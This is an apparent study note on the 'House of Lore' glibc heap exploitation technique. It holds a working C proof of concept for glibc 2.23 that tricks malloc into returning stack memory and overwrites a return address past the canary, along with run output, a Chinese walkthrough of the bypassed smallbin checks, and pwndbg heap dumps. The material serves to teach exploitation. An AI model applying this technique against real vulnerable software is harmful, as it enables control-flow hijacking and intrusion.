# house_of_lore

```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(0x100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(0x100);


  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(0x100);
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

  // sanity check
  assert((long)__builtin_return_address(0) == (long)jackpot);
}
```

**result**

```c
Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0xa21010
stack_buffer_1 at 0x7fff9895f250
stack_buffer_2 at 0x7fff9895f230
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0xa21120
Freeing the chunk 0xa21010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are nil
victim->fwd: 0x7f7965627b78
victim->bk: 0x7f7965627b78

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0xa21010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0xa21510
The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0x7f7965627c78
victim->bk: 0x7f7965627c78

Now emulating a vulnerability that can overwrite the victim->bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(0x100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7f7965627c78

p4 is 0x7fff9895f260 and should be on the stack!
Nice jump d00d
```

**analysis**

申请一个small chunk，然后在栈上伪造了应该是两个chunk，fake chunk1的fd指向刚刚申请的small chunk，bk指向fake chunk2，同时fake chunk2的bk要指向fake chunk2。

之后，申请了一个large chunk用来防止small chunk与top chunk合并。然后，free了small chunk，但是这时small chunk还没有加入到small bin中。所以又申请了一个large chunk，这样unsorted bin和small bin都无法满足要求，通过这种操作将small chunk放入了small bin中。

接着，我们修改victim的bk使其指向fake chunk1，注意此时bin头的fd和bk都指向了victim。之后申请与victim一样大小的chunk，就可以将其再次申请回来。但是bin头指针发生了变化。

```c
  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          if (victim == 0) /* initialization check */
            malloc_consolidate (av);
          else
            {
              bck = victim->bk;
	if (__glibc_unlikely (bck->fd != victim))
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;

              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
    }
```

看这段代码（10-20），我们将victim的bk指向了fake chunk1，fake chunk1的fd指向victim，成功绕过了这个检查。

之后，bin的bk指针指向fake chunk1，而fake chunk1的fd指向了bin头。

可以发现，在申请的过程中我们没有用到bin头的fd，当然也没修改它。最后再次申请small bin，size要等于victim。

再来看这段检查，victim就是fake chunk1，bck是fake chunk2，bck的fd指向fake chunk1，也绕过了检查。这样我们就申请到了栈上的空间。

**gdb**

```c
pwndbg> vis 0x603000

0x603000	0x0000000000000000	0x0000000000000111	................
0x603010	0x0000000000000000	0x0000000000000000	................
0x603020	0x0000000000000000	0x0000000000000000	................
0x603030	0x0000000000000000	0x0000000000000000	................
0x603040	0x0000000000000000	0x0000000000000000	................
0x603050	0x0000000000000000	0x0000000000000000	................
0x603060	0x0000000000000000	0x0000000000000000	................
0x603070	0x0000000000000000	0x0000000000000000	................
0x603080	0x0000000000000000	0x0000000000000000	................
0x603090	0x0000000000000000	0x0000000000000000	................
0x6030a0	0x0000000000000000	0x0000000000000000	................
0x6030b0	0x0000000000000000	0x0000000000000000	................
0x6030c0	0x0000000000000000	0x0000000000000000	................
0x6030d0	0x0000000000000000	0x0000000000000000	................
0x6030e0	0x0000000000000000	0x0000000000000000	................
0x6030f0	0x0000000000000000	0x0000000000000000	................
0x603100	0x0000000000000000	0x0000000000000000	................
0x603110	0x0000000000000000	0x0000000000020ef1	................	 <-- Top chunk
```

申请victim，后堆的布局

````c
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603000
smallbins
empty
largebins
empty
````

free(victim)之后

```c
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x110: 0x603000 —▸ 0x7ffff7dd1c78 (main_arena+344) ◂— 0x603000
largebins
empty
```

申请一个大的chunk后，victim被放入了smallbins

```c
pwndbg> heap
Free chunk (smallbins) | PREV_INUSE
Addr: 0x603000
Size: 0x111
fd: 0x7ffff7dd1c78
bk: 0x7fffffffdc70
```

修改bk指针。

```c
smallbins
0x110 [corrupted]
FD: 0x603000 —▸ 0x7ffff7dd1c78 (main_arena+344) ◂— 0x603000
BK: 0x7fffffffdc70 —▸ 0x7fffffffdc50 —▸ 0x400c9d (__libc_csu_init+77) ◂— nop    
```

malloc(0x100)后，smallbin的头部bk等于victim的bk。

```c
smallbins
0x110 [corrupted]
FD: 0x603000 —▸ 0x7ffff7dd1c78 (main_arena+344) ◂— 0x603000
BK: 0x7fffffffdc50 —▸ 0x400c9d (__libc_csu_init+77) ◂— nop 
```

再次malloc(0x100)，可以看到fd没有任何改变，但是bk发生了变化。我们也成功申请出了chunk。